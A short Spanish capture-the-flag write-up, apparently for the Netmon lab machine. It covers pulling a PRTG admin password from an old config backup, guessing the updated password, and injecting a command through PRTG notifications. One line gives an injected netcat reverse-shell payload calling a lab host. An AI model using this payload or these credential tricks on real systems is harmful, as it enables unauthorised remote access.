@@ -1,0 +1,39 @@
+maquina netmon -------------------------- windows
+
+
+aprendizaje
+
+-----------------------
+
+esta manquina sacar el user.txt es por ftp (es lo mas sencillo por eso no se explica) 
+
+
+
+luego para poder entrar a la pagina por el ftp hemos explorado los archivos que tiene la maquina
+guiandonos por el nombre del programa que corre la pagina que es PRTG 
+llegando a un archivo que se llama PRTG Configuration.old.bak
+
+en ese archivo hemos buscado un usuario y una contraseña
+
+PrTg@dmin2018
+
+prtgadmin
+
+deducimos que al ser archivos viejos y que tienen contraseñas antiguas 
+el PrTg@dmin2018 cambia a PrTg@dmin2019 y podemos entrar. 
+
+hemos visto un articulo en esta pagina 
+
+https://www.codewatch.org/blog/?p=453
+
+que dice que en la seccion de notificaciones podemos inyectar codigo a traves de crear una 
+notificacion nueva en la seccion de ejecutar programa, poniendo este texto 
+
+test.txt;\\10.10.14.25\netmon\nc.exe -e cmd 10.10.14.25 4646 /add
+
+
+solo tenemos que montar un servicio compartido en la carpeta donde tenemos el netcat y ponernos 
+en escucha y listo ahi buscamos la flag de root y listo. 
+
+
+
